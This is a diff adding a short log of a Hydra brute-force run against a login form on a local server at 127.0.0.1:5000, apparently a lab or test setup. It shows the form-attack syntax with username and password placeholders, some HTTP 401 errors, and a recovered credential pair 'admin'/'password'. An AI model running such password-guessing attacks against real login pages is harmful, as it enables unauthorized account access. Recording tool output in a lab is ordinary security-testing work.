@@ -1,0 +1,13 @@
+[2026-09-22T02:06:48+00:00] 로그인 폼 무차별 대입 · 127.0.0.1:5000/login (http-post-form)
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-21 22:06:48
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task
+[DATA] attacking http-post-form://127.0.0.1:5000/login:username=^USER^&password=^PASS^:F=invalid
+[ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set "1=".
+[ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set "1=".
+[ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set "1=".
+[5000][http-post-form] host: 127.0.0.1   misc: /login:username=^USER^&password=^PASS^:F=invalid   login: admin   password: password
+[STATUS] attack finished for 127.0.0.1 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-21 22:06:48
